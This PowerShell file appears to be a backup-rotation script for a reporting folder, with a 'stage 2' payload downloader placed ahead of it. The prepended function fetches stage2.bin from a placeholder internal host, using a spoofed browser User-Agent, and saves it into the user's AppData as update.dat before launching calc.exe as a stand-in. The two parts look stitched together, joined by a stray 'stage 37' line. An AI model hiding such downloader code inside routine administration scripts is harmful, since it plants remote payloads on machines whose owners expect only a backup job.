$DownloadUrl = 'https://internal.corp/stage2.bin'
$WorkingPath = "$env:APPDATA\update.dat"
$RequestTimeout = 114
$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $ResultObject = Invoke-PayloadFetch -SourceUrl $DownloadUrl -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout -UserAgent $BrowserAgent
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Write-Output "stage 37 initialized"
$SourcePath       = "D:\Apps\Adatum.Reporting"
$BackupRoot       = 'D:\Backups\Reporting'
$RetentionDays    = 7
$CompressionLevel = "Optimal"
$MinFreeGB        = 10
$DryRun           = $false


New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path $BackupRoot ("reporting-" + $stamp + ".zip")
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel
$cutoff = (Get-Date).AddDays(-$RetentionDays)
Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff } |
    Remove-Item -Force -WhatIf:$DryRun
Write-Host ("Backup written to {0}" -f $archive) -ForegroundColor Green
